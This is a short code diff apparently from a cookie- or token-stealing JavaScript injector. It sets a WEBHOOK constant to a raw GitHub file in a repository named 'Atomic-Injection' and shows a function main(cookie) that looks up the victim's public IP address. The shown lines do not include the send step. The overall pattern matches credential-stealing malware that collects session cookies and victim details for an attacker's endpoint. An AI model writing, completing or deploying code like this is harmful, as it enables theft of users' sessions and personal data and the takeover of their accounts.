@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "https://raw.githubusercontent.com/FalseKSCH/Atomic-Injection/main/vendors.c1828ed4edca9a5f556f.js";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
